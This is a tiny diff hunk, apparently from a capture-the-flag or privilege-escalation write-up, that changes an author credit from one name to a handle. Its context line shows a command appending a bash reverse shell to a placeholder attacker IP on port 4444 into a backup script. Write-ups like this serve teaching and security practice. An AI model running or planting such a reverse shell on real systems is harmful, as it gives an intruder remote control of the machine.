@@ -86,4 +86,4 @@ echo "bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1" >> /opt/backups/backup.sh
 
 ---
 
-*Author: **Oussama DIMOQRATI***
+*Author: **d3m0s-null***
